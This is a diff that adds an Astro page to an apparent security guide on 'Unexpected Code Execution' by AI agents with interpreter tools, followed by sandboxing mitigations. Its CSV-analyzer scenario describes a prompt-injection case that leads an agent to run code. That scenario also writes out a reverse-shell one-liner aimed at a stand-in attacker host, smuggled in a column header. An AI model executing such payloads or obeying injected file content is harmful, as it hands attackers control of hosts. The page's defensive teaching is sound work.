@@ -1,0 +1,65 @@
+---
+import ContentLayout from '../../layouts/ContentLayout.astro';
+import FlipCard from '../../components/FlipCard.astro';
+import StepWalkthrough from '../../components/StepWalkthrough.astro';
+---
+
+<ContentLayout
+  title="ASI05: Unexpected Code Execution"
+  description="The security risks of allowing AI agents to generate, compile, and execute code (Python, JS, Shell) in unisolated host environments, leading to host compromise."
+  category="Agentic AI Top 10"
+  readingTime="8 min read"
+  severity="critical"
+>
+
+<h2>When the Model Writes Its Own Exploits</h2>
+
+<p>One of the most powerful paradigms of agentic AI is "code execution"—giving the model access to a Python interpreter or a Bash shell to write scripts, solve math problems, or parse data. However, if this execution happens directly on the host system or inside an unisolated container, it is equivalent to granting an attacker an open SSH terminal.</p>
+
+<p><strong>Unexpected Code Execution</strong> happens when an agent, manipulated via direct or indirect prompt injection, generates malicious code and then runs it using its execution tools. Because models excel at writing script files, they can construct tailored exploits, parse local networks, harvest internal metadata, and establish persistent backdoors.</p>
+
+<FlipCard
+  scenario="Scenario: The CSV Analyzer Loop"
+  frontTitle="Processing CSV Data with Python"
+  frontContent="An HR analytics agent accepts user-uploaded spreadsheet files. To calculate complex metrics, the agent uses a Python tool to dynamically compile and execute pandas scripts."
+  backTitle="Reverse Shell execution via CSV Injection"
+  backContent={`<p>An attacker uploads a CSV file containing a malicious column header: <em>"import os; os.system('bash -i >& /dev/tcp/evil-c2.net/4444 0>&1')"</em>. The agent reads the header, writes a Python script to parse it, and passes it to the local execution engine.</p><p>When the tool calls the Python interpreter, the injected command is executed. A reverse shell connection is established back to the attacker, giving them terminal access to the docker container running the web application.</p><ul><li>Untrusted data from the CSV was directly executed by the interpreter</li><li>The container did not use a read-only root filesystem, allowing local changes</li><li>Egress network routing permitted connections to arbitrary C2 servers</li><li>Mitigated by isolating code execution to strict, network-less microVMs</li></ul>`}
+/>
+
+<h2>Unexpected Execution Vectors</h2>
+
+<div class="threat-card critical">
+  <h4>Dynamic Code Compilation</h4>
+  <p>Allowing the agent to write and execute scripts (like `.py` or `.js` files) on the host file system. Attackers inject commands that import system libraries (`os`, `subprocess`) to execute terminal shells.</p>
+</div>
+
+<div class="threat-card high">
+  <h4>Bash / Shell Tool Access</h4>
+  <p>Giving the agent access to shell utilities. A model can easily be tricked into running system updates, modifying system configurations, or executing remote file downloads via `wget` or `curl` commands.</p>
+</div>
+
+<div class="threat-card medium">
+  <h4>Arbitrary Dependency Installation</h4>
+  <p>The agent dynamically runs commands like `pip install` or `npm install` inside the sandbox, pulling down malicious packages or dependencies containing trojans.</p>
+</div>
+
+<StepWalkthrough
+  title="Securing Agentic Code Interpreters"
+  steps={[
+    { title: "Enforce Isolated MicroVM Sandboxing", content: "Never run interpreter tools inside the main application container. Execute all dynamically generated scripts in ephemeral, short-lived microVMs (like Firecracker) or WebAssembly runtimes.", icon: "📦" },
+    { title: "Disable Host Network Access", content: "Ensure the code interpreter sandbox has no access to the external internet or local private networks. This prevents the code from initiating reverse shells or exfiltrating data.", icon: "🚫" },
+    { title: "Configure Read-Only Root Filesystem", content: "Mount the sandbox's core filesystem as read-only. Allow scripts to write only to a designated `/tmp` scratchpad directory that is destroyed immediately after execution.", icon: "📂" },
+    { title: "Apply Rigid CPU & Memory Quotas", content: "Limit the execution resources of the interpreter. Set hard memory bounds and strict CPU timeouts (e.g., max 2 seconds execution) to block denial-of-service loops.", icon: "⏱️" },
+  ]}
+/>
+
+<div class="defense-section">
+  <h3>Code Execution Rules</h3>
+  <ol>
+    <li><strong>Ephemeral Containers.</strong> Spin up a fresh sandbox for every code execution request, and destroy the environment immediately after returning the output. Do not maintain state between runs.</li>
+    <li><strong>Static Pre-parsing.</strong> Use AST (Abstract Syntax Tree) parsers to check generated code for forbidden system calls (`fork`, `exec`, `socket`, `eval`) before sending it to the interpreter.</li>
+    <li><strong>Block Root Execution.</strong> Never run code execution agents as the `root` user inside the sandbox. Enforce low-privilege runner accounts.</li>
+  </ol>
+</div>
+
+</ContentLayout>
